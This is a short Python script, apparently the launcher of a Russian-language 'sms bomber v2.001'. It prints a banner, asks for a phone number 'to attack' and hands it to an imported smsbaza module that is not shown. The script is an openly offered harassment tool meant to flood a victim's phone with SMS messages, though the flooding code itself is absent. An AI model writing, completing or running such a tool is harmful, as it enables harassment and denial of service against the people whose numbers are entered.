import smsbaza
import smsbaza2
slot1 = "пусто"
def bann(slot1):
	banner = """
_________________________________________
|	sms bomber v2.001		|
|	razrab = miha			|
| слот 1: """+slot1+"""                                                  
|                                       |
|_______________________________________|
"""
	print (banner)
bann("пусто",)
i = input (" введите номе для атаки: ")
bann (i)
smsbaza.s(i)
